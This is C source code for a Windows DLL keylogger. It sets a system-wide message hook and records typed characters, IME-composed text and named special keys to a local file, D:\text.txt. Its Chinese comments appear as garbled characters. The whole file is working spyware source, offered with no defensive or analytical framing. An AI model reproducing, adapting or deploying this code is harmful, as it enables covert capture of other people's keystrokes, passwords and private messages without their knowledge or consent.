
#include<windows.h>
#include<stdio.h>
#include<string.h>
#include <imm.h>
#pragma comment(lib,"imm32.lib")

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved);
//void SetHook(HWND hwnd);
//void UnHook();
LRESULT CALLBACK KeyBoardProc(int iCode,WPARAM wParam,LPARAM lParam );
HHOOK g_hLogHook=NULL;
HINSTANCE g_hInst=NULL;
//HWND g_hWnd;

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpvReserved)
{
	g_hInst=hinstDLL;
	return TRUE;
}
LRESULT CALLBACK KeyBoardProc(int iCode,WPARAM wParam,LPARAM lParam )
{
	LRESULT Result=CallNextHookEx(g_hLogHook,iCode,wParam,lParam);
	if (iCode == HC_ACTION)
	{
	MSG* pmsg = (MSG*)lParam;//lparamָ��ṹ�������MSG�����Զ���һ��MSG�ṹָ��
	if(!(wParam == PM_REMOVE))//�ж���Ϣ�Ƿ����Ϣ�ж���ɾ�����Ա���д���ظ�
		return 0;
		switch (pmsg->message)
		{	
		case WM_IME_COMPOSITION:
			{
				if(pmsg->lParam & GCS_RESULTSTR)//�ж��Ƿ�Ϊ���������������������˼
				{
					HIMC hIMC;
					HWND hWnd=pmsg->hwnd;
					DWORD dwSize;
					char lpstr[128]={'\0'};
					hIMC = ImmGetContext(hWnd);
					if (!hIMC)
					{
						return 0;
					}
					
					dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
					dwSize += sizeof(WCHAR);
					memset(lpstr, 0, sizeof(lpstr));
					ImmGetCompositionString(hIMC, GCS_RESULTSTR, lpstr, dwSize);
					
					FILE *stream;
					stream=fopen("D:\\text.txt","a+");
					//MessageBox(NULL,(LPCSTR)lpstr,TEXT("MY"),MB_OK);
					fwrite(&lpstr,strlen(lpstr),1,stream);
					fclose(stream);
					ImmReleaseContext(hWnd, hIMC);
				}
			}
			break;
		case WM_CHAR:
			{
				if(ImmIsIME(GetKeyboardLayout(0)))
					if((unsigned char)(pmsg->wParam)>0x7F)//ASCII�ַ����127��255 (0x7f-0xff) ����������
						return 0;
				//MessageBox(NULL,TEXT("MY"),TEXT("MY"),MB_OK);
					FILE *stream;
					stream=fopen("D:\\text.txt","a+");
					char ch1;
					if(pmsg->wParam==VK_ESCAPE)
					{
						return 0;
					}
					else
						if (pmsg->wParam==VK_BACK)
						{
							return 0;
						}
						else
						{
							ch1=(char)(pmsg->wParam);
							fwrite(&ch1,1,1,stream);
							fclose(stream);
						}
			}
			break;
			case WM_KEYDOWN:
				{
					FILE *stream;
					stream=fopen("D:\\text.txt","a+");
					switch(pmsg->wParam)
					{
						case VK_TAB:
						{
							char ch1[]="[TAB]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_RETURN:
						{
							char ch1[]="[ENTER]";
							fwrite(&ch1,strlen(ch1),1,stream);
							fprintf(stream,"\n");
						}
						break;
					case VK_BACK:
						{
							char ch1[]="[BACK]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_ESCAPE:
						{
							char ch1[]="[Esc]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_DELETE:
						{
							char ch1[]="[delete]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_END:
						{
							char ch1[]="[END]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_HOME:
						{
							char ch1[]="[HOME]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_INSERT:
						{
							char ch1[]="[INSERT]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_PRIOR:
						{
							char ch1[]="[PageUp]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_NEXT:
						{
							char ch1[]="[PageDown]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_CAPITAL:
						{
							char ch1[]="[CapsLock]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_LEFT:
						{
							char ch1[]="<-";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_RIGHT:
						{
							char ch1[]="->";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_UP:
						{
							char ch1[]="UP";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_DOWN:
						{
							char ch1[]="DOWN";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_PRINT:
						{
							char ch1[]="[PrintScreenSysRq]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_SCROLL:
						{
							char ch1[]="[ScrollLock]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_PAUSE:
						{
							char ch1[]="[PauseBreak]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_NUMLOCK:
						{
							char ch1[]="[NumLock]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F1:
						{
							char ch1[]="[F1]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F2:
						{
							char ch1[]="[F2]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F3:
						{
							char ch1[]="[F3]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F4:
						{
							char ch1[]="[F4]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F5:
						{
							char ch1[]="[F5]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F6:
						{
							char ch1[]="[F6]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F7:
						{
							char ch1[]="[F7]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F8:
						{
							char ch1[]="[F8]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F9:
						{
							char ch1[]="[F9]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F10:
						{
							char ch1[]="[F10]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F11:
						{
							char ch1[]="[F11]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					case VK_F12:
						{
							char ch1[]="[F12]";
							fwrite(&ch1,strlen(ch1),1,stream);
						}
						break;
					default:
						break;
					}
					fclose(stream);
				}
			break;
		}
	}
	return Result;
}
void SetHook()
{
	//g_hWnd=hwnd;
	g_hLogHook=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)KeyBoardProc,g_hInst,0);//WH_GETMESSAGE���ӷ��͵�������Ϣ���������Ϣ
}
void UnHook()
{
	//SendMessage(g_hWnd,WM_CLOSE,0,0);
	UnhookWindowsHookEx(g_hLogHook);
	g_hLogHook=NULL;

}